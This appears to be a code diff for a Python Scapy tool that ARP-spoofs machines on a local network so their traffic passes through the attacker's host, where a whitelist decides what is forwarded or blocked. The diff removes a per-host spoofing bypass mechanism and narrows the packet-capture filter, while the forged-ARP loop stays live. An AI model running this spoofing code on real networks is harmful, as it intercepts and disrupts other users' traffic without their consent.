@@ -467,87 +467,12 @@ def get_mac_address(ip_address, interface):
 stop_event_flag = threading.Event()
 
 
-class BypassRegistry:
-    def __init__(self):
-        self._registry = {}
-        self._lock = threading.Lock()
-
-    def enable(self, target_ip, duration=8):
-        expiry = time.time() + duration
-        with self._lock:
-            previous = self._registry.get(target_ip, 0)
-            self._registry[target_ip] = expiry
-        return expiry > previous
-
-    def disable(self, target_ip):
-        with self._lock:
-            return self._registry.pop(target_ip, None) is not None
-
-    def should_spoof(self, target_ip):
-        with self._lock:
-            expiry = self._registry.get(target_ip)
-            if expiry is None:
-                return True
-            if expiry < time.time():
-                del self._registry[target_ip]
-                return True
-            return False
-
-    def clear(self):
-        with self._lock:
-            self._registry.clear()
-
-
-def spoof_pair(gateway_ip, gateway_mac, target_ip, target_mac, attacker_mac, interface, count=2):
-    if not (gateway_mac and target_mac):
-        return
-    sendp(
-        Ether(dst=target_mac)
-        / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=attacker_mac, hwdst=target_mac),
-        iface=interface,
-        count=count,
-        inter=0.1,
-        verbose=False,
-    )
-    sendp(
-        Ether(dst=gateway_mac)
-        / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=attacker_mac, hwdst=gateway_mac),
-        iface=interface,
-        count=count,
-        inter=0.1,
-        verbose=False,
-    )
-
-
-def restore_pair(gateway_ip, gateway_mac, target_ip, target_mac, interface, count=3):
-    if not (gateway_mac and target_mac):
-        return
-    sendp(
-        Ether(dst=target_mac)
-        / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=gateway_mac, hwdst=target_mac),
-        iface=interface,
-        count=count,
-        inter=0.1,
-        verbose=False,
-    )
-    sendp(
-        Ether(dst=gateway_mac)
-        / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac, hwdst=gateway_mac),
-        iface=interface,
-        count=count,
-        inter=0.1,
-        verbose=False,
-    )
-
-
-def arp_spoof(gateway_ip, gateway_mac, target_macs, attacker_mac, interface, bypass_registry):
+def arp_spoof(gateway_ip, gateway_mac, target_macs, attacker_mac, interface):
     """持续进行 ARP 欺骗的背景执行绪"""
     while not stop_event_flag.is_set():
         try:
             for target_ip, target_mac in target_macs.items():
                 if target_mac:
-                    if not bypass_registry.should_spoof(target_ip):
-                        continue
                     sendp(
                         Ether(dst=target_mac)
                         / ARP(
@@ -734,10 +659,18 @@ def resolve_whitelist_entries(whitelist_urls):
     return ipv4_set, ipv6_set
 
 
+def build_ipv4_target_filter(target_ips):
+    hosts = sorted({ip for ip in target_ips if ip})
+    if not hosts:
+        return ''
+    clauses = [f"(ip src host {ip} or ip dst host {ip})" for ip in hosts]
+    return ' or '.join(clauses)
+
+
 def forward_frame(packet, forwarder, src_mac, dst_mac):
     if not forwarder:
         return
-    frame = packet.copy()
+    frame = packet
     frame[Ether].src = src_mac
     frame[Ether].dst = dst_mac
 
@@ -758,7 +691,6 @@ def main():
     spoof_thread = None
     forwarder = None
     limiter = None
-    bypass_registry = BypassRegistry()
     INTERFACE = GATEWAY_IP = ATTACKER_IP = None
     ATTACKER_MAC = GATEWAY_MAC = None
     target_macs = {}
@@ -831,12 +763,18 @@ def main():
             if force or limiter.should_emit(key):
                 event('packet', meta)
 
-        bpf_filter = f"ether dst {ATTACKER_MAC} and (ip or ip6)"
+        ipv4_host_clause = build_ipv4_target_filter(target_macs.keys())
+        if ipv4_host_clause:
+            bpf_filter = (
+                f"ether dst {ATTACKER_MAC} and ((ip and ({ipv4_host_clause})) or ip6)"
+            )
+        else:
+            bpf_filter = f"ether dst {ATTACKER_MAC} and (ip or ip6)"
         log('debug', f"Using BPF filter: {bpf_filter}")
 
         spoof_thread = threading.Thread(
             target=arp_spoof,
-            args=(GATEWAY_IP, GATEWAY_MAC, target_macs, ATTACKER_MAC, INTERFACE, bypass_registry),
+            args=(GATEWAY_IP, GATEWAY_MAC, target_macs, ATTACKER_MAC, INTERFACE),
             daemon=True,
         )
         spoof_thread.start()
@@ -879,16 +817,9 @@ def main():
                     emit_packet(meta, force=status == 'blocked')
 
                     if allowed:
-                        if bypass_registry.enable(src_ip):
-                            restore_pair(GATEWAY_IP, GATEWAY_MAC, src_ip, target_macs.get(src_ip), INTERFACE)
                         forward_frame(packet, forwarder, ATTACKER_MAC, GATEWAY_MAC)
-                    else:
-                        if bypass_registry.disable(src_ip):
-                            spoof_pair(GATEWAY_IP, GATEWAY_MAC, src_ip, target_macs.get(src_ip), ATTACKER_MAC, INTERFACE)
                     # 非白名單流量留在本機，維持阻擋
                 elif dst_ip in target_macs:
-                    if bypass_registry.disable(dst_ip):
-                        spoof_pair(GATEWAY_IP, GATEWAY_MAC, dst_ip, target_macs.get(dst_ip), ATTACKER_MAC, INTERFACE)
                     target_mac = target_macs[dst_ip]
                     forward_frame(packet, forwarder, ATTACKER_MAC, target_mac)
 
@@ -909,12 +840,8 @@ def main():
                     }, force=status == 'blocked')
 
                     if allowed:
-                        if human_ip and bypass_registry.enable(human_ip):
-                            restore_pair(GATEWAY_IP, GATEWAY_MAC, human_ip, target_macs.get(human_ip), INTERFACE)
                         forward_frame(packet, forwarder, ATTACKER_MAC, GATEWAY_MAC)
                     else:
-                        if human_ip and bypass_registry.disable(human_ip):
-                            spoof_pair(GATEWAY_IP, GATEWAY_MAC, human_ip, target_macs.get(human_ip), ATTACKER_MAC, INTERFACE)
                         block_ipv6_packet(packet, src_mac)
                 elif src_mac == GATEWAY_MAC:
                     target_mac = ipv6_local_map.get(dst_ipv6)
@@ -946,7 +873,6 @@ def main():
             limiter.reset()
         if forwarder:
             forwarder.close()
-        bypass_registry.clear()
         if INTERFACE and GATEWAY_IP and GATEWAY_MAC and target_macs:
             restore_arp(GATEWAY_IP, GATEWAY_MAC, target_macs, INTERFACE)
 
@@ -958,5 +884,6 @@ if __name__ == "__main__":
         main()
     except KeyboardInterrupt:
         stop_event_flag.set()
+
 
 '''
